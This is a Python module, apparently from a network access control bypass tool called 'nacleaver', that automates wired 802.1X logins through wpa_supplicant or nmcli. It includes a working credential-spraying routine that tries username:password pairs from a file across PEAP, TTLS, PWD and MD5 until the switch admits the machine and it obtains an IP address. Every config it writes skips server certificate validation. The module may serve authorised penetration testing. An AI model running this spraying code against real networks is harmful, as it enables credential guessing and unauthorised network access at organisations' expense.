import logging
import os
import random
import string
import time
from dataclasses import dataclass, field
from enum import Enum

from core.utils import (
    check_dependency,
    get_iface_ip,
    kill_process_on_iface,
    run_subprocess,
)

logger = logging.getLogger('nacleaver')


class EAPMethod(Enum):
    PEAP_MSCHAPV2 = "peap_mschapv2"
    TTLS_MSCHAPV2 = "ttls_mschapv2"
    TTLS_PAP      = "ttls_pap"
    PWD           = "pwd"
    MD5           = "md5"
    TLS           = "tls"


DEFAULT_METHOD_ORDER = [
    EAPMethod.PEAP_MSCHAPV2,
    EAPMethod.TTLS_MSCHAPV2,
    EAPMethod.TTLS_PAP,
    EAPMethod.PWD,
    EAPMethod.MD5,
]


@dataclass
class AttemptRecord:
    method: str
    identity: str
    password: str
    success: bool
    duration_sec: float
    backend: str
    error: str | None = None


@dataclass
class Dot1XResult:
    success: bool
    method_used: EAPMethod | None
    identity: str | None
    password: str | None
    obtained_ip: str | None
    backend_used: str
    attempts: list[AttemptRecord] = field(default_factory=list)
    error: str | None = None


def generate_wpa_config(
    method: EAPMethod,
    identity: str,
    password: str,
    client_cert: str | None = None,
    private_key: str | None = None,
    private_key_passwd: str | None = None,
) -> str:
    """Write a wpa_supplicant config for wired 802.1X. Returns the config file path."""
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    config_path = f"/tmp/nacleaver_wpa_{rand_suffix}.conf"

    base = (
        "ctrl_interface=/var/run/wpa_supplicant\n"
        "ctrl_interface_group=0\n"
        "ap_scan=0\n"
        "network={\n"
        "    key_mgmt=IEEE8021X\n"
        "    eapol_flags=0\n"
    )

    if method == EAPMethod.PEAP_MSCHAPV2:
        eap_block = (
            "    eap=PEAP\n"
            "    phase1=\"peaplabel=0\"\n"
            "    phase2=\"auth=MSCHAPV2\"\n"
            "    ca_cert=\"\"\n"
            f"    identity=\"{identity}\"\n"
            f"    password=\"{password}\"\n"
        )
    elif method == EAPMethod.TTLS_MSCHAPV2:
        eap_block = (
            "    eap=TTLS\n"
            "    phase2=\"auth=MSCHAPV2\"\n"
            "    ca_cert=\"\"\n"
            f"    identity=\"{identity}\"\n"
            f"    password=\"{password}\"\n"
        )
    elif method == EAPMethod.TTLS_PAP:
        eap_block = (
            "    eap=TTLS\n"
            "    phase2=\"auth=PAP\"\n"
            "    ca_cert=\"\"\n"
            f"    identity=\"{identity}\"\n"
            f"    password=\"{password}\"\n"
        )
    elif method == EAPMethod.PWD:
        eap_block = (
            "    eap=PWD\n"
            f"    identity=\"{identity}\"\n"
            f"    password=\"{password}\"\n"
        )
    elif method == EAPMethod.MD5:
        eap_block = (
            "    eap=MD5\n"
            "    key_mgmt=IEEE8021X\n"
            f"    identity=\"{identity}\"\n"
            f"    password=\"{password}\"\n"
        )
    elif method == EAPMethod.TLS:
        cert = client_cert or ""
        key = private_key or ""
        key_pass = private_key_passwd or ""
        eap_block = (
            "    eap=TLS\n"
            "    ca_cert=\"\"\n"
            f"    client_cert=\"{cert}\"\n"
            f"    private_key=\"{key}\"\n"
            f"    private_key_passwd=\"{key_pass}\"\n"
            f"    identity=\"{identity}\"\n"
        )
    else:
        raise ValueError(f"Unknown EAP method: {method}")

    config = base + eap_block + "}\n"

    with open(config_path, 'w') as f:
        f.write(config)
    os.chmod(config_path, 0o600)

    return config_path


def _try_wpa_supplicant(
    iface: str,
    method: EAPMethod,
    identity: str,
    password: str,
    timeout: int = 15,
    client_cert: str | None = None,
    private_key: str | None = None,
) -> tuple[bool, str | None]:
    """Try 802.1X auth via wpa_supplicant. Returns (success, obtained_ip)."""
    kill_process_on_iface("wpa_supplicant", iface)
    kill_process_on_iface("dhclient", iface)
    time.sleep(1)

    config_path = generate_wpa_config(
        method, identity, password,
        client_cert=client_cert,
        private_key=private_key,
    )

    log_path = f"/tmp/nacleaver_wpa_{iface}.log"
    rc, _, err = run_subprocess([
        "wpa_supplicant", "-B", "-D", "wired",
        "-i", iface,
        "-c", config_path,
        "-f", log_path,
    ])

    if rc != 0:
        logger.debug(f"[dot1x] wpa_supplicant launch failed (rc={rc}): {err}")
        try:
            os.remove(config_path)
        except OSError:
            pass
        return False, None

    fail_count = 0
    success = False
    deadline = time.time() + timeout

    while time.time() < deadline:
        time.sleep(1)
        rc_cli, out_cli, _ = run_subprocess(["wpa_cli", "-i", iface, "status"], timeout=3)
        if rc_cli != 0:
            fail_count += 1
            if fail_count >= 3:
                break
            continue

        state = ""
        for line in out_cli.splitlines():
            if line.startswith("wpa_state="):
                state = line.split("=", 1)[1].strip()
                break

        if state == "COMPLETED":
            success = True
            break
        elif state in ("DISCONNECTED", "HELD"):
            fail_count += 1
            if fail_count >= 3:
                break

    obtained_ip = None
    if success:
        logger.info(f"[dot1x] wpa_supplicant: {method.value} auth COMPLETED for {identity}")
        run_subprocess(["dhclient", "-v", "-1", iface], timeout=15)
        obtained_ip = get_iface_ip(iface)

    kill_process_on_iface("wpa_supplicant", iface)
    try:
        os.remove(config_path)
    except OSError:
        pass

    return success, obtained_ip


def _try_nmcli(
    iface: str,
    conn_name: str,
    method: EAPMethod,
    identity: str,
    password: str,
    timeout: int = 15,
) -> tuple[bool, str | None]:
    """Try 802.1X auth via NetworkManager/nmcli. Returns (success, obtained_ip)."""
    rc, _, _ = run_subprocess(["nmcli", "-t", "con", "show", conn_name])
    if rc != 0:
        run_subprocess([
            "nmcli", "con", "add", "type", "ethernet",
            "ifname", iface,
            "con-name", conn_name,
        ])

    if method == EAPMethod.PEAP_MSCHAPV2:
        eap_val = "peap"
        phase2_val = "mschapv2"
    elif method == EAPMethod.TTLS_MSCHAPV2:
        eap_val = "ttls"
        phase2_val = "mschapv2"
    elif method == EAPMethod.TTLS_PAP:
        eap_val = "ttls"
        phase2_val = "pap"
    elif method == EAPMethod.PWD:
        eap_val = "pwd"
        phase2_val = None
    elif method == EAPMethod.MD5:
        eap_val = "md5"
        phase2_val = None
    elif method == EAPMethod.TLS:
        eap_val = "tls"
        phase2_val = None
    else:
        raise ValueError(f"Unknown EAP method: {method}")

    modify_cmd = [
        "nmcli", "con", "modify", conn_name,
        "802-1x.eap", eap_val,
        "802-1x.identity", identity,
        "802-1x.password", password,
        "802-1x.password-flags", "0",
        "802-1x.system-ca-certs", "no",
        "ipv4.method", "auto",
    ]
    if phase2_val:
        modify_cmd += ["802-1x.phase2-auth", phase2_val]

    run_subprocess(modify_cmd)

    run_subprocess(["nmcli", "con", "down", conn_name])
    time.sleep(2)

    rc, out, err = run_subprocess([
        "nmcli", "con", "up", conn_name,
        "--wait", str(timeout),
    ], timeout=timeout + 5)

    if rc == 0:
        ip = get_iface_ip(iface)
        logger.info(f"[dot1x] nmcli: {method.value} auth succeeded for {identity}, IP={ip}")
        return ip is not None, ip
    else:
        logger.debug(f"[dot1x] nmcli up failed (rc={rc}): {err}")
        return False, None


def _select_backend(preferred: str) -> str:
    if preferred == "auto":
        if check_dependency("wpa_supplicant") and check_dependency("wpa_cli"):
            return "wpa_supplicant"
        elif check_dependency("nmcli"):
            return "nmcli"
        else:
            raise RuntimeError("Neither wpa_supplicant nor nmcli is available")
    if preferred == "wpa_supplicant":
        if not check_dependency("wpa_supplicant"):
            raise RuntimeError("wpa_supplicant not found in PATH")
        return "wpa_supplicant"
    if preferred == "nmcli":
        if not check_dependency("nmcli"):
            raise RuntimeError("nmcli not found in PATH")
        return "nmcli"
    raise RuntimeError(f"Unknown backend: {preferred}")


def _parse_creds_file(path: str) -> list[tuple[str, str]]:
    creds = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                parts = line.split(':', 1)
                creds.append((parts[0], parts[1]))
            else:
                creds.append((line, ''))
    return creds


def _attempt_auth(
    iface: str,
    method: EAPMethod,
    identity: str,
    password: str,
    timeout: int,
    backend: str,
    conn_name: str,
    client_cert: str | None,
    private_key: str | None,
) -> tuple[bool, str | None, str | None]:
    """Single authentication attempt. Returns (success, obtained_ip, error)."""
    try:
        if backend == "wpa_supplicant":
            success, ip = _try_wpa_supplicant(
                iface, method, identity, password, timeout,
                client_cert=client_cert, private_key=private_key,
            )
        else:
            success, ip = _try_nmcli(iface, conn_name, method, identity, password, timeout)
        return success, ip, None
    except Exception as e:
        logger.debug(f"[dot1x] Auth attempt error: {e}")
        return False, None, str(e)


def spray_credentials(
    iface: str,
    creds_file: str,
    methods: list[EAPMethod] = DEFAULT_METHOD_ORDER,
    timeout_per_attempt: int = 15,
    spray_delay: float = 2.0,
    backend: str = "auto",
    conn_name: str = "NACleaver-8021x",
    client_cert: str | None = None,
    private_key: str | None = None,
    verbose: bool = False,
) -> 'Dot1XResult':
    """Spray credentials from file across EAP methods."""
    selected_backend = _select_backend(backend)
    creds = _parse_creds_file(creds_file)
    attempts: list[AttemptRecord] = []

    logger.info(f"[dot1x] Spraying {len(creds)} credential(s) across {len(methods)} method(s)")

    for identity, password in creds:
        for method in methods:
            t_start = time.time()
            success, ip, err = _attempt_auth(
                iface, method, identity, password,
                timeout_per_attempt, selected_backend, conn_name,
                client_cert, private_key,
            )
            duration = time.time() - t_start

            rec = AttemptRecord(
                method=method.value,
                identity=identity,
                password=password,
                success=success,
                duration_sec=duration,
                backend=selected_backend,
                error=err,
            )
            attempts.append(rec)

            if success:
                logger.info(f"[dot1x] SUCCESS: {identity}/{method.value} → {ip}")
                return Dot1XResult(
                    success=True,
                    method_used=method,
                    identity=identity,
                    password=password,
                    obtained_ip=ip,
                    backend_used=selected_backend,
                    attempts=attempts,
                )

            logger.info(f"[dot1x] FAIL: {identity}/{method.value}")
            time.sleep(spray_delay)

    return Dot1XResult(
        success=False,
        method_used=None,
        identity=None,
        password=None,
        obtained_ip=None,
        backend_used=selected_backend,
        attempts=attempts,
        error="All credentials exhausted",
    )


def run_dot1x(
    iface: str,
    identity: str | None = None,
    password: str | None = None,
    creds_file: str | None = None,
    methods: list[EAPMethod] = DEFAULT_METHOD_ORDER,
    timeout: int = 15,
    spray_delay: float = 2.0,
    backend: str = "auto",
    conn_name: str = "NACleaver-8021x",
    client_cert: str | None = None,
    private_key: str | None = None,
    verbose: bool = False,
) -> Dot1XResult:
    """Run 802.1X authentication, with optional credential spraying."""
    if creds_file:
        return spray_credentials(
            iface, creds_file, methods=methods,
            timeout_per_attempt=timeout, spray_delay=spray_delay,
            backend=backend, conn_name=conn_name,
            client_cert=client_cert, private_key=private_key,
            verbose=verbose,
        )

    if not identity:
        raise ValueError("Must provide --username or --creds-file")

    selected_backend = _select_backend(backend)
    passwd = password or ''
    attempts: list[AttemptRecord] = []

    for method in methods:
        t_start = time.time()
        success, ip, err = _attempt_auth(
            iface, method, identity, passwd,
            timeout, selected_backend, conn_name,
            client_cert, private_key,
        )
        duration = time.time() - t_start

        rec = AttemptRecord(
            method=method.value,
            identity=identity,
            password=passwd,
            success=success,
            duration_sec=duration,
            backend=selected_backend,
            error=err,
        )
        attempts.append(rec)

        if success:
            logger.info(f"[dot1x] SUCCESS: {identity}/{method.value} → {ip}")
            return Dot1XResult(
                success=True,
                method_used=method,
                identity=identity,
                password=passwd,
                obtained_ip=ip,
                backend_used=selected_backend,
                attempts=attempts,
            )

        logger.info(f"[dot1x] FAIL: {identity}/{method.value}")

    return Dot1XResult(
        success=False,
        method_used=None,
        identity=identity,
        password=passwd,
        obtained_ip=None,
        backend_used=selected_backend,
        attempts=attempts,
        error="All EAP methods failed",
    )


if __name__ == "__main__":
    import sys
    from rich import print as rprint
    from core.utils import require_root, setup_logging
    require_root()
    setup_logging(verbose=True)
    if len(sys.argv) < 4:
        print("Usage: sudo python3 core/dot1x.py <iface> <username> <password>")
        sys.exit(1)
    iface = sys.argv[1]
    user = sys.argv[2]
    passwd = sys.argv[3]
    result = run_dot1x(iface, identity=user, password=passwd, verbose=True)
    rprint(result)
